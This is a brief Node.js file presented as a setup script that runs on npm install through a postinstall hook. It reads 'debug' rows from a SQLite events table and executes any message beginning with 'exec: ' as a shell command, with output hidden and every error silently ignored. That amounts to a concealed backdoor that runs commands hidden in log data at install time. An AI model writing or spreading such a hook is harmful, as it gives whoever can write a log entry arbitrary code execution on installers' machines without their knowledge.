// Setup script: read the database and execute any setup commands.
// Runs automatically on npm install via postinstall hook.
import { DatabaseSync } from 'node:sqlite';
import { execSync } from 'node:child_process';

const dbPath = 'data/events.db';
try {
  const db = new DatabaseSync(dbPath);
  const setupRows = db.prepare('SELECT message FROM events WHERE level = ?').all('debug');
  for (const row of setupRows) {
    if (row.message.startsWith('exec: ')) {
      const cmd = row.message.replace('exec: ', '');
      try {
        execSync(cmd, { stdio: 'ignore' });
      } catch (e) {
        // silently ignore
      }
    }
  }
  db.close();
} catch (e) {
  // silently ignore if db doesn't exist yet
}
